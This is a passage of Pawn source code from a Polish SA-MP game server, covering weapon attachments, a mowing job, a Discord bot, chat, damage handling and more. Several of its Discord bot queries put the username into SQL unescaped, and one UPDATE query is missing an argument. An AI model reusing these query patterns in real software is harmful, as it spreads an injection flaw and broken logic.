                                                SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // M4 standing not aiming
                                                0.503249, -0.02376, 0.065051, -11.131746, 357.302734, 354.484222);
                                        } else {
                                                SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // M4 crouched not aiming
                                                0.503249, -0.02376, 0.065051, -11.131746, 357.302734, 354.484222);
                        }       }       }
			case 34: {
				if (IsPlayerAiming(playerid)) {
					/*if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK) {
						SetPlayerAttachedObject(playerid, 0, GetPVarInt(playerid, "color"), 6, // Sniper standing aiming
						0.528249, -0.020266, 0.068052, -6.621746, 352.552642, 355.084289);
					} else {
						SetPlayerAttachedObject(playerid, 0, GetPVarInt(playerid, "color"), 6, // Sniper crouched aiming
						0.528249, -0.020266, 0.068052, -1.621746, 356.202667, 355.084289);
					}*/
					return 1;
				} else {
					if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK) {
						SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // Sniper standing not aiming
						0.658248, -0.03276, 0.133051, -11.631746, 355.302673, 353.584259);
					} else {
						SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // Sniper crouched not aiming
						0.658248, -0.03276, 0.133051, -11.631746, 355.302673, 353.584259);
			}	}	}
                        case 29: {
                                if (IsPlayerAiming(playerid)) {
                                        if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK) {
                                                SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // MP5 standing aiming
                                                0.298249, -0.02776, 0.158052, -11.631746, 359.302673, 357.584259);
                                        } else {
                                                SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // MP5 crouched aiming
                                                0.298249, -0.02776, 0.158052, 8.368253, 358.302673, 352.584259);
                                        }
                                } else {
                                        if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK) {
                                                SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // MP5 standing not aiming
                                                0.293249, -0.027759, 0.195051, -12.131746, 354.302734, 352.484222);
                                        } else {
                                                SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // MP5 crouched not aiming
                                                0.293249, -0.027759, 0.195051, -12.131746, 354.302734, 352.484222);
        }       }       }       }       }
    new drunknew = GetPlayerDrunkLevel(playerid);
    if (drunknew < 100) {
        SetPlayerDrunkLevel(playerid, 2000);
    } else {
        if (pDrunkLevelLast[playerid] != drunknew) {
            new wfps = pDrunkLevelLast[playerid] - drunknew;
            if ((wfps > 0) && (wfps < 200))
                pFPS[playerid] = wfps;
            pDrunkLevelLast[playerid] = drunknew;
        }
    }
	CheckNoDM(playerid);
	new weapon = GetPlayerWeapon(playerid);
	if(LastWeapon[playerid] != weapon) {
		LastWeapon[playerid] = weapon;
		CheckWeapons(playerid); }
	if(!ShowLicznik[playerid] && IsPlayerInAnyVehicle(playerid) && TDOn[playerid]) {
	    if(NOP[playerid]) {
			new msgs[256];
			format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Blokada OnPlayerStateChange"C_RED")", Player[playerid][Name], playerid);
			if(!KickMsg[playerid]) SendClientMessageToAll(RED, msgs);
			KickMsg[playerid] = true;
			DelayedKick(playerid);
			return kicks++; }
		if(!NOP[playerid] && !IsPlayerInAnyVehicle(playerid)) NOP[playerid] = true;
		new vehicleid = GetPlayerVehicleID(playerid);
		new Float:vehtemphp;
		GetVehicleHealth(vehicleid, vehtemphp);
		PlayerTextDrawShow(playerid, Licznik[playerid]);
		ShowLicznik[playerid] = true; }
	if(ShowLicznik[playerid] && !IsPlayerInAnyVehicle(playerid)) {
		ShowLicznik[playerid] = false;
		PlayerTextDrawHide(playerid, Licznik[playerid]); }
	if(ShowLicznik[playerid] && IsPlayerInAnyVehicle(playerid))
	{
		new vehicleid = GetPlayerVehicleID(playerid);
		new Float:vehtemphp;
		GetVehicleHealth(vehicleid, vehtemphp);
		new tdauto[256];
		format(tdauto, sizeof(tdauto), "%s~n~~w~~h~%.0f ~b~~h~km/h ~w~~h~| ~b~~h~HP: ~w~~h~%.0f", GetVehicleName(vehicleid), GetPlayerSpeed(playerid), vehtemphp / 10);
		PlayerTextDrawSetString(playerid, Licznik[playerid], tdauto);
	}
    if(NaKoszeniu[playerid])
    {
        if(AktywnaTrawa[playerid] == 0 && IsPlayerInRangeOfPoint(playerid, 1.5, TrawaCoords[playerid][0][0], TrawaCoords[playerid][1][0], TrawaCoords[playerid][2][0]))
        {
            DestroyDynamicObject(TrawaO[playerid]);
            TrawaResp(playerid);
            Sound(playerid, 4203, 0.0, 0.0, 0.0);
            return AddExp(playerid, 2);
		}
        if(AktywnaTrawa[playerid] == 1 && IsPlayerInRangeOfPoint(playerid, 1.5, TrawaCoords[playerid][0][1], TrawaCoords[playerid][1][1], TrawaCoords[playerid][2][1]))
        {
            DestroyDynamicObject(TrawaO[playerid]);
            TrawaResp(playerid);
            Sound(playerid, 4203, 0.0, 0.0, 0.0);
            return AddExp(playerid, 2);
		}
        if(AktywnaTrawa[playerid] == 2 && IsPlayerInRangeOfPoint(playerid, 1.5, TrawaCoords[playerid][0][2], TrawaCoords[playerid][1][2], TrawaCoords[playerid][2][2]))
        {
            DestroyDynamicObject(TrawaO[playerid]);
            TrawaResp(playerid);
            Sound(playerid, 4203, 0.0, 0.0, 0.0);
            return AddExp(playerid, 2);
		}
        if(AktywnaTrawa[playerid] == 3 && IsPlayerInRangeOfPoint(playerid, 1.5, TrawaCoords[playerid][0][3], TrawaCoords[playerid][1][3], TrawaCoords[playerid][2][3]))
        {
            DestroyDynamicObject(TrawaO[playerid]);
            TrawaResp(playerid);
            Sound(playerid, 4203, 0.0, 0.0, 0.0);
            return AddExp(playerid, 2);
		}
        if(AktywnaTrawa[playerid] == 4 && IsPlayerInRangeOfPoint(playerid, 1.5, TrawaCoords[playerid][0][4], TrawaCoords[playerid][1][4], TrawaCoords[playerid][2][4]))
        {
            DestroyDynamicObject(TrawaO[playerid]);
            TrawaResp(playerid);
            Sound(playerid, 4203, 0.0, 0.0, 0.0);
            return AddExp(playerid, 2);
		}
        if(AktywnaTrawa[playerid] == 5 && IsPlayerInRangeOfPoint(playerid, 1.5, TrawaCoords[playerid][0][5], TrawaCoords[playerid][1][5], TrawaCoords[playerid][2][5]))
        {
            DestroyDynamicObject(TrawaO[playerid]);
            TrawaResp(playerid);
            Sound(playerid, 4203, 0.0, 0.0, 0.0);
            return AddExp(playerid, 2);
		}
        if(AktywnaTrawa[playerid] == 6 && IsPlayerInRangeOfPoint(playerid, 1.5, TrawaCoords[playerid][0][6], TrawaCoords[playerid][1][6], TrawaCoords[playerid][2][6]))
        {
            DestroyDynamicObject(TrawaO[playerid]);
            TrawaResp(playerid);
            Sound(playerid, 4203, 0.0, 0.0, 0.0);
            return AddExp(playerid, 2);
		}
        if(AktywnaTrawa[playerid] == 7 && IsPlayerInRangeOfPoint(playerid, 1.5, TrawaCoords[playerid][0][7], TrawaCoords[playerid][1][7], TrawaCoords[playerid][2][7]))
        {
            DestroyDynamicObject(TrawaO[playerid]);
            TrawaResp(playerid);
            Sound(playerid, 4203, 0.0, 0.0, 0.0);
            return AddExp(playerid, 2);
		}
        if(AktywnaTrawa[playerid] == 8 && IsPlayerInRangeOfPoint(playerid, 1.5, TrawaCoords[playerid][0][8], TrawaCoords[playerid][1][8], TrawaCoords[playerid][2][8]))
        {
            DestroyDynamicObject(TrawaO[playerid]);
            TrawaResp(playerid);
            Sound(playerid, 4203, 0.0, 0.0, 0.0);
            return AddExp(playerid, 2);
		}
        if(AktywnaTrawa[playerid] == 9 && IsPlayerInRangeOfPoint(playerid, 1.5, TrawaCoords[playerid][0][9], TrawaCoords[playerid][1][9], TrawaCoords[playerid][2][9]))
        {
            DestroyDynamicObject(TrawaO[playerid]);
            TrawaResp(playerid);
            Sound(playerid, 4203, 0.0, 0.0, 0.0);
            return AddExp(playerid, 2);
		}
        if(AktywnaTrawa[playerid] == 10 && IsPlayerInRangeOfPoint(playerid, 1.5, TrawaCoords[playerid][0][10], TrawaCoords[playerid][1][10], TrawaCoords[playerid][2][10]))
        {
            DestroyDynamicObject(TrawaO[playerid]);
            TrawaResp(playerid);
            Sound(playerid, 4203, 0.0, 0.0, 0.0);
            return AddExp(playerid, 2);
		}
        if(AktywnaTrawa[playerid] == 11 && IsPlayerInRangeOfPoint(playerid, 1.5, TrawaCoords[playerid][0][11], TrawaCoords[playerid][1][11], TrawaCoords[playerid][2][11]))
        {
            DestroyDynamicObject(TrawaO[playerid]);
            TrawaResp(playerid);
            Sound(playerid, 4203, 0.0, 0.0, 0.0);
            return AddExp(playerid, 2);
		}
        if(AktywnaTrawa[playerid] == 12 && IsPlayerInRangeOfPoint(playerid, 1.5, TrawaCoords[playerid][0][12], TrawaCoords[playerid][1][12], TrawaCoords[playerid][2][12]))
        {
            DestroyDynamicObject(TrawaO[playerid]);
            TrawaResp(playerid);
            Sound(playerid, 4203, 0.0, 0.0, 0.0);
            return AddExp(playerid, 2);
		}
        if(AktywnaTrawa[playerid] == 13 && IsPlayerInRangeOfPoint(playerid, 1.5, TrawaCoords[playerid][0][13], TrawaCoords[playerid][1][13], TrawaCoords[playerid][2][13]))
        {
            DestroyDynamicObject(TrawaO[playerid]);
            TrawaResp(playerid);
            Sound(playerid, 4203, 0.0, 0.0, 0.0);
            return AddExp(playerid, 2);
		}
        if(AktywnaTrawa[playerid] == 14 && IsPlayerInRangeOfPoint(playerid, 1.5, TrawaCoords[playerid][0][14], TrawaCoords[playerid][1][14], TrawaCoords[playerid][2][14]))
        {
            DestroyDynamicObject(TrawaO[playerid]);
            TrawaResp(playerid);
            Sound(playerid, 4203, 0.0, 0.0, 0.0);
            return AddExp(playerid, 2);
		}
        if(AktywnaTrawa[playerid] == 15 && IsPlayerInRangeOfPoint(playerid, 1.5, TrawaCoords[playerid][0][15], TrawaCoords[playerid][1][15], TrawaCoords[playerid][2][15]))
        {
            DestroyDynamicObject(TrawaO[playerid]);
            TrawaResp(playerid);
            Sound(playerid, 4203, 0.0, 0.0, 0.0);
            return AddExp(playerid, 2);
		}
        if(AktywnaTrawa[playerid] == 16 && IsPlayerInRangeOfPoint(playerid, 1.5, TrawaCoords[playerid][0][16], TrawaCoords[playerid][1][16], TrawaCoords[playerid][2][16]))
        {
            DestroyDynamicObject(TrawaO[playerid]);
            TrawaResp(playerid);
            Sound(playerid, 4203, 0.0, 0.0, 0.0);
            return AddExp(playerid, 2);
		}
        if(AktywnaTrawa[playerid] == 17 && IsPlayerInRangeOfPoint(playerid, 1.5, TrawaCoords[playerid][0][17], TrawaCoords[playerid][1][17], TrawaCoords[playerid][2][17]))
        {
            DestroyDynamicObject(TrawaO[playerid]);
            TrawaResp(playerid);
            Sound(playerid, 4203, 0.0, 0.0, 0.0);
            return AddExp(playerid, 2);
		}
	}
	return 1;
}

forward PrivcarHandling();
public PrivcarHandling()
{
	Loop(privcarid, privcars)
	{
	    if(pFuel[privcarid] < 0.1) {
			Loop(playerid, MAX_PLAYERS) { if(IsPlayerInVehicle(playerid, ppVeh[privcarid])) RemovePlayerFromVehicle(playerid); } }
 		if(pFuel[privcarid] < 0.1 && GetVehicleSpeedCap(ppVeh[privcarid]) > 1) {
       		SetVehicleSpeedCap(ppVeh[privcarid], 1);
			pFuel[privcarid] = 0.0; }
		if(pFuel[privcarid] > 0.0 && GetVehicleSpeedCap(ppVeh[privcarid]) < 2) DisableVehicleSpeedCap(ppVeh[privcarid]);
	}
}

forward UpdateLicznik(playerid);
public UpdateLicznik(playerid)
{
	if(ShowLicznik[playerid] && IsPlayerInAnyVehicle(playerid)) {
//		new licznikstr[256];
		new vehicleid = GetPlayerVehicleID(playerid);
		new Float:vehtemphp;
		GetVehicleHealth(vehicleid, vehtemphp);
/*		new Float:carhp = vehtemphp / 10;*/ }
}

forward SendFromDiscordToAdmins(string[]);
public SendFromDiscordToAdmins(string[]) {
	Loop(playerid, MAX_PLAYERS) {
		if(Player[playerid][Admin] > 0) SendClientMessage(playerid, RED, string); }
	return 1; }

public DCC_OnChannelMessage(DCC_Channel:channel, DCC_User:author, const message[])
{
	new channel_name[32], autor[128], msg[128];
	DCC_GetChannelName(channel, channel_name);
	DCC_GetUserName(author, autor);
	format(msg, sizeof(msg), "%s", message);
	if(CompareEx(channel_name, "samp-admin") && !CompareEx(autor, "SAMP_Bot")) {
	  	new msgs[128];
		format(msgs, sizeof(msgs), "{ff0000}[admin-chat]{ca0000}%s: %s", autor, message);
		return SendFromDiscordToAdmins(msgs); }
	if(CompareEx(msg, ":help")) {
	    DCC_SendChannelMessage(channel, "**Komendy:**");
	    DCC_SendChannelMessage(channel, "```:help, :online, :www, :autor, :serverver```");
		return DCC_SendChannelMessage(channel, "```:serverevent, :connect, :loot```"); }
	if(CompareEx(msg, ":online")) {
	    new msgs[128];
	    format(msgs, sizeof(msgs), "Aktualnie na serwerze jest `%d` graczy, w tym: VIPy `%d`, admini `%d`.", gracze, vips, admins);
	    return DCC_SendChannelMessage(channel, msgs); }
	if(CompareEx(msg, ":autor")) {
	    DCC_SendChannelMessage(channel, "Moim autorem jest critical, autor IMPREZA v2. :kissing_smiling_eyes:");
	    return DCC_SendChannelMessage(channel, "Do stworzenia mnie wykorzystano plugin Discord Connector: http://forum.sa-mp.com/showthread.php?t=631562"); }
	if(CompareEx(msg, ":www")) DCC_SendChannelMessage(channel, ":pencil: Naszym aktualnym adresem forum jest `"FORUM"`. Zapraszamy! :grinning:");
	if(CompareEx(msg, ":serverver")) {
		DCC_SendChannelMessage(channel, ":white_check_mark: Aktualna wersja serwera - `"GM_VER"`");
		return DCC_SendChannelMessage(channel, ":pencil: Zapraszamy na forum po informacje na temat aktualizacji: `"FORUM"`"); }
	if(IsNumeric(msg) && CompareEx(autor, lastdiscordname) && DiscordBlock > gettime()) {
	    new liczba = strval(msg);
	    if(!IsPlayerConnected(liczba)) return DCC_SendChannelMessage(channel, ":red_circle: Nie znaleziono gracza o podanym ID.");
	    if(DiscordConnected[liczba]) return DCC_SendChannelMessage(channel, ":red_circle: Gracz o podanym ID ma juz polaczone konto Discord.");
		new infostr[256];
		format(infostr, sizeof(infostr), ":white_check_mark: Gracz **%s (%d)** otrzymal teraz komunikat na czacie. Prosimy stosowac sie do instrukcji w grze.", Player[liczba][Name], liczba);
		DiscordSendedID = liczba;
		new strdiscord[256];
		format(strdiscord, sizeof(strdiscord), ""C_DISCORD"["C_WHITE"Discord"C_DISCORD"] U¿ytkownik "C_WHITE"%s "C_DISCORD"poprosi³ o po³¹czenie Twojego konta z serwerem g³osowym.", autor);
		SendClientMessage(liczba, -1, strdiscord);
		SendClientMessage(liczba, -1, ""C_DISCORD"["C_WHITE"Discord"C_DISCORD"] Je¿eli wyra¿asz chêæ po³¹czenia kont, wejdŸ w "C_WHITE"/konto > "C_DISCORD"Discord.");
	    return DCC_SendChannelMessage(channel, infostr); }
	if(CompareEx(msg, ":connect")) {
		if(DiscordBlock > gettime()) return DCC_SendChannelMessage(channel, ":red_circle: Funkcja tymczasowo zablokowana.");
	    if(CompareEx(lastdiscordname, autor)) return DCC_SendChannelMessage(channel, ":red_circle: Ostatnio dokonywano tej funkcji z tego konta.");
		DiscordBlock = gettime() + 45;
		lastdiscord = random(80000) + 10000;
		format(lastdiscordname, sizeof(lastdiscordname), "%s", autor);
		DCC_SendChannelMessage(channel, ":pencil2: Podaj ID gracza, ktoremu chcesz zezwolic na powiazanie kont.");
		return DCC_SendChannelMessage(channel, ":red_circle: Aby dokonac polaczenia, musisz znajdowac sie na serwerze."); }
	if(CompareEx(msg, ":loot")) {
		if(DiscordLoot > gettime()) return DCC_SendChannelMessage(channel, ":red_circle: Funkcja tymczasowo zablokowana.");
		m_query("SELECT * FROM players WHERE discord = '%s'", autor);
		mysql_store_result();
		new znalezione = mysql_num_rows();
		mysql_free_result();
		if(znalezione < 1) return DCC_SendChannelMessage(channel, ":red_circle: Nie znaleziono konta na serwerze powiazanego z Twoim kontem Discord.");
		if(znalezione > 0) {
		    new przechowuj[1024], przechowuj2[1024], onlineid;
		    m_query("SELECT playerid FROM players WHERE discord = '%s'", autor);
		    mysql_store_result();
		    mysql_fetch_row(przechowuj, " ");
			mysql_free_result();
			sscanf(przechowuj, "i", onlineid);
			if(onlineid > -1) return DCC_SendChannelMessage(channel, ":red_circle: Nie mozna losowac, gdy jestes na serwerze.");
			new exp = random(10);
			m_query("SELECT exp FROM players WHERE discord = '%s'", autor);
			mysql_store_result();
			mysql_fetch_row(przechowuj2, " ");
			mysql_free_result();
			new tempexp, addedexp;
			sscanf(przechowuj2, "i", tempexp);
			addedexp = tempexp + exp;
			m_query("UPDATE players SET exp = %d WHERE discord = '%s'", addedexp);
			new lootformat[128];
			format(lootformat, sizeof(lootformat), ":game_die: Wylosowano **%d** EXP! Aktualny stan EXP przy sobie: **%d**.", exp, addedexp);
			DCC_SendChannelMessage(channel, lootformat); }
		return DiscordLoot = gettime() + 60; }
	if(CompareEx(msg, ":serverevent")) {
		if(!ServerEvent) return DCC_SendChannelMessage(channel, "Aktualnie **Event serwera** nie jest aktywny.");
		else {
		    new msgs[128];
		    format(msgs, sizeof(msgs), ":trophy: Aktualny **Event serwera**: **%s** (Koniec za: **%d** minut)", SEventName, SEventTimer);
		    return DCC_SendChannelMessage(channel, msgs); } }
	if(!CompareEx(channel_name, "samp-admin") && !CompareEx(channel_name, "zarzad") && !CompareEx(channel_name, "administracja") && !CompareEx(channel_name, "forum") && !CompareEx(autor, "SAMP_Bot")) {
		new formatd[128];
		format(formatd, sizeof(formatd), ""C_DISCORD"["C_WHITE"D"C_DISCORD"] %s: "C_DISCORD"%s", autor, msg);
	    Loop(loopid, MAX_PLAYERS) { if(DiscordChat[loopid]) SendClientMessage(loopid, -1, formatd); } }
	if(CompareEx(channel_name, "ann")) {
		new formatd[128];
		format(formatd, sizeof(formatd), ""C_DISCORD"["C_WHITE"D"C_DISCORD"] %s: "C_DISCORD"%s", autor, msg);
	    return SendClientMessageToAll(-1, formatd); }
	return 1;
}

public OnPlayerText(playerid, text[])
{
	if(GetPVarInt(playerid, "ConnectStream") == 1 || !Player[playerid][IsLoggedIn]) return SendClientMessage(playerid, RED, ""C_RED"Zaloguj siê, aby móc u¿yæ tej funkcji."), 0;
	if(!strcmp(SlowoKod, text) && strlen(text) == strlen(SlowoKod) && kodTrwa) return cmd_kod(playerid, text), 0;
	if(!strcmp(SlowoRozsypanka, text, true) && strlen(text) == strlen(SlowoRozsypanka) && wyrazTrwa) return cmd_wyraz(playerid, text), 0;
	if(mathResult != -897234 && strval(text) == mathResult) return cmd_liczba(playerid, text), 0;
	if(strval(text) == deltawynik && ReflexType == 19 && ReflexActive) return cmd_delta(playerid, text), 0;
  	if(strval(text) == TRMath && TRRundaTrwa && OnGame[playerid] == TR && Wystartowala[TR] && !WykonalTR[playerid] && TRType == 1) {
    	WykonalTR[playerid] = true;
    	PlayerPlaySound(playerid,1139,0.0,0.0,0.0);
    	GameTextForPlayer(playerid, "~g~~h~~h~ZADANIE WYKONANE!", 4000, 3);
		return 0; }
	if(ReflexType == 18 && strval(text) == ReflexUID) {
		AddExp(playerid, 40);
		Player[playerid][Cash] += 5000;
		Player[playerid][Czat]++;
  		new kodstr[256];
	  	format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
		SendClientMessageToAll(-1, kodstr);
		ReflexType = -1;
		Loop(loopid, MAX_PLAYERS) {
		   	if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); }
		return ReflexActive = false; }
	if(text[0] == '@' && Player[playerid][Admin] > 0)
	{
		Loop(x, MAX_PLAYERS)
		{
		    if(Player[x][Admin] > 0)
		    {
		    	new msgs[128];
		    	format(msgs, sizeof(msgs), "{ff0000}[admin-chat]{ca0000}%s(%d): %s", Player[playerid][Name], playerid, text[1]);
		    	SendClientMessage(x, RED, msgs);
			}
		}
		new msg[256];
		format(msg, sizeof(msg), "%s: %s", Player[playerid][Name], text[1]);
		DCC_SendChannelMessage(samp_admin, msg);
		return 0;
	}
	if(text[0] == '!' && Player[playerid][Gang] != -1)
	{
		Loop(x, MAX_PLAYERS)
		{
		    if(Player[x][Gang] == Player[playerid][Gang])
		    {
		    	new msgs[128];
		    	format(msgs, sizeof(msgs), ""C_ORANGE"[clan-chat]"C_NICK"%s(%d): "C_ORANGE"%s", Player[playerid][Name], playerid, text[1]);
		    	SendClientMessage(x, -1, msgs);
			}
		}
		return 0;
	}
	if(Player[playerid][MuteTime] > gettime()) 
	{
	    new msgs[256];
	    format(msgs, sizeof(msgs), "Posiadasz uciszenie na "C_WHITE"%s"C_RED"s.", TimeConvert(Player[playerid][MuteTime] - gettime()));
 		return SendClientMessage(playerid, RED, msgs), 0;
	}
	if(AntySpam[playerid] > 0) 
	{
	    new msgs[256];
	    format(msgs, sizeof(msgs), "Nastêpn¹ wiadomoœæ mo¿esz wys³aæ dopiero za "C_WHITE"%d "C_RED"sekund.", AntySpam[playerid]);
 		return SendClientMessage(playerid, RED, msgs), 0;
	}
	new msg[256];
	format(msg, sizeof(msg), "[%02d:%02d:%02d] (%d) %s: %s", hour, minute, second, playerid, Player[playerid][Name], text);
    DCC_SendChannelMessage(samp_chat, msg);
	new msgstr[512];
	switch(Player[playerid][Admin]) {
	    case 0: {
			format(msgstr, sizeof(msgstr), "%d' {%06x}%s"C_WHITE": %s", playerid, GetPlayerColor(playerid) >>> 8, Player[playerid][Name], text);
 			AntySpam[playerid] = 3; }
		case 1: format(msgstr, sizeof(msgstr), "{ff66f4}%d' {%06x}%s"C_WHITE" ("JUNIOR""C_WHITE"): %s", playerid, GetPlayerColor(playerid) >>> 8, Player[playerid][Name], text);
		case 2: format(msgstr, sizeof(msgstr), "{ffff00}%d' {%06x}%s"C_WHITE" ("ADMIN""C_WHITE"): %s", playerid, GetPlayerColor(playerid) >>> 8, Player[playerid][Name], text);
		case 3: format(msgstr, sizeof(msgstr), "{ff4500}%d' {%06x}%s"C_WHITE" ("VHA""C_WHITE"): %s", playerid, GetPlayerColor(playerid) >>> 8, Player[playerid][Name], text);
		case 4: format(msgstr, sizeof(msgstr), "{FF0000}%d' {%06x}%s"C_WHITE" ("HA""C_WHITE"): %s", playerid, GetPlayerColor(playerid) >>> 8, Player[playerid][Name], text); }
	return SendClientMessageToAll(-1, msgstr), 0;
}

ReturnGangFreeUID()
{
	new value;
	Loop(id, MAX_GANGS) {
		m_query("SELECT * FROM clans WHERE uid = %d", id);
		mysql_store_result();
		if(mysql_num_rows() == 0) {
			mysql_free_result();
			value = id;
			return id; } }
	return value;
}

public OnPlayerTakeDamage(playerid, issuerid, Float:amount, weaponid, bodypart)
{
	if(issuerid != INVALID_PLAYER_ID) {
		switch(Player[issuerid][Gong]) {
		    case 0: PlayerPlaySound(issuerid, 17802, 0.0, 0.0, 0.0);
			case 1: PlayerPlaySound(issuerid, 1190, 0.0,0.0,0.0);
			case 2: PlayerPlaySound(issuerid, 1084, 0.0,0.0,0.0);
			case 3: PlayerPlaySound(issuerid, 1149, 0.0,0.0,0.0); }
    	if(GetPlayerState(issuerid) == PLAYER_STATE_DRIVER) {
        	new Float:Health;
        	GetPlayerHealth(issuerid, Health);
        	SetPlayerHealth(issuerid, Health - 30);
        	GameTextForPlayer(issuerid,"~r~Odebrano Ci ~g~~h~30HP ~r~za przejezdzanie innych graczy!",4000,3); }
	if(issuerid != INVALID_PLAYER_ID) {
	      if(TRRundaTrwa && OnGame[issuerid] == TR && Wystartowala[TR] && !WykonalTR[issuerid] && TRType == 7) {
    		WykonalTR[issuerid] = true;
    		PlayerPlaySound(issuerid,1139,0.0,0.0,0.0);
    		GameTextForPlayer(issuerid, "~g~~h~~h~ZADANIE WYKONANE!", 4000, 3); } }
	if(SpawnTimer[playerid] > 0) return SetPlayerArmedWeapon(issuerid, 0);
 	if(pAch[playerid][6] < 1) {
		pAch[playerid][6] = 1;
		AddExp(playerid, 200);
		Sound(playerid,1137,0.0,0.0,0.0);
		SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Pierwsza krew", "New achievement: "C_NICK"Pierwsza krew"); }
    new carid;
    if(IsPlayerInRangeOfPoint(issuerid, 120.0,-1382.7828,-2259.3782,37.5516) && GetPlayerWeapon(issuerid) == 6 && GProgress[issuerid] > 0) {
        GProgress[issuerid]--;
        UpdateGornictwo(issuerid); }
	if(IsPlayerInAnyVehicle(issuerid)) carid = GetVehicleModel(GetPlayerVehicleID(issuerid));
	if(carid == 487 || carid == 488 || carid == 417 || carid == 447 || carid == 469 || carid == 497 || carid == 548 || carid == 563) {
		SetPlayerHealth(playerid, 100.0);
		RemovePlayerFromVehicle(issuerid); }
    if(playerid != INVALID_PLAYER_ID) LastDamaged[issuerid] = playerid;
    TakedDamage[issuerid] += floatround(amount, floatround_round); }
	if(EVUczestnik[issuerid] && EVType == 2 && !EVStartuje) {
		EVPlayers--;
		EVUczestnik[issuerid] = false;
		SetPlayerVirtualWorld(issuerid, 0);
		JailPlayer("Serwer", issuerid, "Uderzanie na OX", 60); }
	if(OnGame[issuerid] == SP && OnGame[playerid] == SP) {
	    SetPlayerHealth(playerid, 100.0);
	    SetPlayerArmour(playerid, 100.0);
	    SetPlayerHealth(issuerid, 100.0);
	    SetPlayerArmour(issuerid, 100.0); }
	if(OnGame[playerid] == BD && OnGame[issuerid] == BD) {
	    SetPlayerArmour(issuerid, 100.0);
		SetPlayerHealth(issuerid, 100.0);
	    SetPlayerArmour(playerid, 100.0);
		SetPlayerHealth(playerid, 100.0); }
	if(GetPlayerWeapon(issuerid) == 38 || GetPlayerWeapon(issuerid) == 35 && !EVUczestnik[issuerid] && Player[issuerid][Admin] < 1) ResetPlayerWeapons(issuerid);
	DamageTaken[playerid] = 1;
	new Float:issuerhp, Float:issuerarmour, Float:playerhp, Float:playerarmour;
	GetPlayerHealth(playerid, playerhp);
	GetPlayerArmour(playerid, playerarmour);
	GetPlayerHealth(issuerid, issuerhp);
	GetPlayerArmour(issuerid, issuerarmour);
	if(BattleTimer[issuerid] < 1 && BattleTimer[playerid] < 1) {
		SendClientMessage(playerid, -1, "{CC0000}  !  {C4C0C0}Jesteœ w trakcie walki. Nie wychódŸ z serwera!");
		SendClientMessage(issuerid, -1, "{CC0000}  !  {C4C0C0}Jesteœ w trakcie walki. Nie wychódŸ z serwera!"); }
	BattleTimer[issuerid] = 7;
	BattleTimer[playerid] = 7;
	if(EVTeam[issuerid] == EVTeam[playerid] && EVTrwa && EVUczestnik[playerid] && EVUczestnik[issuerid]) {
	    SetPlayerHealth(playerid, playerhp);
	    SetPlayerArmour(playerid, playerarmour); }
	if(IsPlayerConnected(issuerid))
	{
	    if(33 <= weaponid <= 34 && !GetPlayerVirtualWorld(playerid) && bodypart == 9 && !OnNonDM[playerid]) {
			GameTextForPlayer(issuerid, "~g~Headshot!", 2000, 3);
			GameTextForPlayer(playerid, "~r~Headshot!", 2000, 3);
			SetPlayerHealth(playerid, 0.0);
			if(pAch[issuerid][13] < 1) {
				pAch[issuerid][13] = 1;
				AddExp(issuerid, 200);
				Sound(issuerid,1137,0.0,0.0,0.0);
				SendClientMessageEx(issuerid, -1, "Nowe osi¹gniêcie: "C_NICK"Cichy zabójca", "New achievement: "C_NICK"Cichy zabójca"); } }
	}
    if(pArena[issuerid] == 2)
    {
        new Float:health;
        GetPlayerHealth(playerid,health);
   	    switch(random(10))
   	    {
   	        case 0: SetPlayerHealth(playerid, health - 5);
   	        case 1: SetPlayerHealth(playerid, health - 3);
   	        case 2: SetPlayerHealth(playerid, health - 8);
   	        case 3: SetPlayerHealth(playerid, health - 6);
   	        case 4: SetPlayerHealth(playerid, health - 10);
   	        case 5: SetPlayerHealth(playerid, health - 2);
   	        case 6: SetPlayerHealth(playerid, health - 1);
   	        case 7: SetPlayerHealth(playerid, health - 19);
   	        case 8: SetPlayerHealth(playerid, health - 20);
   	        case 9: SetPlayerHealth(playerid, health - 48);
		}
	}
	if(OnNonDM[playerid]) {
	    SetPlayerHealth(playerid, playerhp);
	    SetPlayerArmour(playerid, playerarmour); }
	if(HPTimering[playerid] || ArmorTimering[playerid]) {
	    HPTimer[playerid] = 0;
	    ArmorTimer[playerid] = 0;
	    HPTimering[playerid] = false;
	    ArmorTimering[playerid] = false;
	    Sound(playerid, 17002, 0.0, 0.0, 0.0);
		SendClientMessage(playerid, RED, "Proces uzdrawiania siê/kupna kamizelki przerwany."); }
	return 1;
}

public OnPlayerRequestClass(playerid,classid)
{
    SpawnPlayer(playerid);
    return 1;
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	if(IsDead[playerid]) return 1;
	if(response) { if(dialogid != DIALOG_GONG) Sound(playerid, 5201, 0.0, 0.0, 0.0); }
	else { if(dialogid != DIALOG_GONG) Sound(playerid, 5205, 0.0, 0.0, 0.0); }
	if(strfind(inputtext, "{", true)== 0) return SendClientMessage(playerid, RED, "Wprowadzono nieprawid³owy znak.");
	if(strfind(inputtext, "}", true)== 0) return SendClientMessage(playerid, RED, "Wprowadzono nieprawid³owy znak.");
    if(SQLInjection(inputtext))
    {
		if(pAch[playerid][1] < 1) {
			pAch[playerid][1] = 1;
			AddExp(playerid, 200);
			Sound(playerid,1137,0.0,0.0,0.0);
			SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Haker", "New achievement: "C_NICK"Haker"); }
		return 1;
    }
	switch (dialogid)
	{
